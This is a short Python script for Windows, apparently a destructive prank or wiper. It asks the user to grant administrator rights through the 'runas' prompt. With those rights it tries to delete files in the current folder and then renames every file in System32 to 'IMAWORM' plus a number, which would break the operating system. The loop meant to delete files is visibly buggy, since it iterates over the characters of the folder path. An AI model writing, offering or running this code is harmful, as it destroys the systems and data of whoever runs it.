import os, ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    for files in os.getcwd():
        os.remove(files)
    os.chdir("/Windows/System32")
    #https://www.geeksforgeeks.org/rename-all-file-names-in-your-directory-using-python/
    for count, f in enumerate(os.listdir()):
        f_name, f_ext = os.path.splitext(f)
        f_name = "IMAWORM" + str(count)
        new_name = f'{f_name}{f_ext}'
        os.rename(f, new_name)
        
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
